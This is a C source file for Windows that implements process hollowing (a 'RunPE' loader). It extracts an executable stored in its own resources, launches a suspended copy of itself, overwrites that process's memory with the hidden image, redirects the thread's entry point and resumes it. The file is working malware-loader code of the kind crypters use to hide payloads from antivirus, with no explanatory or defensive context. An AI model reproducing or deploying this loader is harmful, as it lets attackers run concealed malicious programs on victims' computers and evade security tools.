//#include <QCoreApplication>

#include <windows.h>
#include <stdio.h>
void RunFromMemory(char* pImage,char* pPath)
{
    DWORD dwWritten = 0;
    DWORD dwHeader = 0;
    DWORD dwImageSize = 0;
    DWORD dwSectionCount = 0;
    DWORD dwSectionSize = 0;
    DWORD firstSection = 0;
    DWORD previousProtection = 0;
    DWORD jmpSize = 0;

    IMAGE_NT_HEADERS INH;
    IMAGE_DOS_HEADER IDH;
    IMAGE_SECTION_HEADER Sections[1000];

    PROCESS_INFORMATION peProcessInformation;
    STARTUPINFO peStartUpInformation;
    CONTEXT pContext;

    char* pMemory;
    char* pFile;
    memcpy(&IDH,pImage,sizeof(IDH));
    memcpy(&INH,(void*)((DWORD)pImage+IDH.e_lfanew),sizeof(INH));

    dwImageSize = INH.OptionalHeader.SizeOfImage;
    pMemory = (char*)malloc(dwImageSize);
    memset(pMemory,0,dwImageSize);
    pFile = pMemory;

    dwHeader = INH.OptionalHeader.SizeOfHeaders;
    firstSection = (DWORD)(((DWORD)pImage+IDH.e_lfanew) + sizeof(IMAGE_NT_HEADERS));
    memcpy(Sections,(char*)(firstSection),sizeof(IMAGE_SECTION_HEADER)*INH.FileHeader.NumberOfSections);

    memcpy(pFile,pImage,dwHeader);

    if((INH.OptionalHeader.SizeOfHeaders % INH.OptionalHeader.SectionAlignment)==0)
    {
        jmpSize = INH.OptionalHeader.SizeOfHeaders;
    }
    else
    {
        jmpSize = INH.OptionalHeader.SizeOfHeaders / INH.OptionalHeader.SectionAlignment;
        jmpSize += 1;
        jmpSize *= INH.OptionalHeader.SectionAlignment;
    }

    pFile = (char*)((DWORD)pFile + jmpSize);

    for(dwSectionCount = 0; dwSectionCount < INH.FileHeader.NumberOfSections; dwSectionCount++)
    {
        jmpSize = 0;
        dwSectionSize = Sections[dwSectionCount].SizeOfRawData;
        memcpy(pFile,(char*)(pImage + Sections[dwSectionCount].PointerToRawData),dwSectionSize);

        if((Sections[dwSectionCount].Misc.VirtualSize % INH.OptionalHeader.SectionAlignment)==0)
        {
            jmpSize = Sections[dwSectionCount].Misc.VirtualSize;
        }
        else
        {
            jmpSize = Sections[dwSectionCount].Misc.VirtualSize / INH.OptionalHeader.SectionAlignment;
            jmpSize += 1;
            jmpSize *= INH.OptionalHeader.SectionAlignment;
        }
        pFile = (char*)((DWORD)pFile + jmpSize);
    }


    memset(&peStartUpInformation,0,sizeof(STARTUPINFO));
    memset(&peProcessInformation,0,sizeof(PROCESS_INFORMATION));
    memset(&pContext,0,sizeof(CONTEXT));

    peStartUpInformation.cb = sizeof(peStartUpInformation);

     wchar_t wtext[MAX_PATH + 1];
     mbstowcs(wtext, pPath, strlen(pPath)+1);//Plus null
     LPWSTR ptr = wtext;

    BOOL isOk = CreateProcess(
                NULL, ptr, NULL, NULL, false, CREATE_SUSPENDED,
                NULL, NULL, &peStartUpInformation, &peProcessInformation);

    if (isOk) {
        pContext.ContextFlags = CONTEXT_FULL;
        GetThreadContext(peProcessInformation.hThread,&pContext);
        VirtualProtectEx(peProcessInformation.hProcess,(void*)((DWORD)INH.OptionalHeader.ImageBase),dwImageSize,PAGE_EXECUTE_READWRITE,&previousProtection);
        WriteProcessMemory(peProcessInformation.hProcess,(void*)((DWORD)INH.OptionalHeader.ImageBase),pMemory,dwImageSize,&dwWritten);
        WriteProcessMemory(peProcessInformation.hProcess,(void*)((DWORD)pContext.Ebx + 8),&INH.OptionalHeader.ImageBase,4,&dwWritten);
        pContext.Eax = INH.OptionalHeader.ImageBase + INH.OptionalHeader.AddressOfEntryPoint;
        SetThreadContext(peProcessInformation.hThread,&pContext);
        VirtualProtectEx(peProcessInformation.hProcess,(void*)((DWORD)INH.OptionalHeader.ImageBase),dwImageSize,previousProtection,0);
        ResumeThread(peProcessInformation.hThread);
    }
    free(pMemory);
}

#define IDD_EXE 1000

#include <stdio.h>

int main(int argc, char *argv[])
{
    HGLOBAL hResData;
    HRSRC   hResInfo;
    void    *pvRes;
    DWORD dwSize;
    HMODULE hModule = GetModuleHandle(NULL);

    if (((hResInfo = FindResource(hModule, MAKEINTRESOURCE(IDD_EXE), RT_RCDATA)) != NULL)
            &&((hResData = LoadResource(hModule, hResInfo)) != NULL)
            &&((pvRes = LockResource(hResData)) != NULL))
    {
        dwSize = SizeofResource(hModule, hResInfo);
        char *lpMemory = (char *) malloc(dwSize);
        memset(lpMemory, 0, dwSize);
        memcpy (lpMemory, pvRes, dwSize);
        RunFromMemory(lpMemory, argv[0]);
    }
    return 0;
}
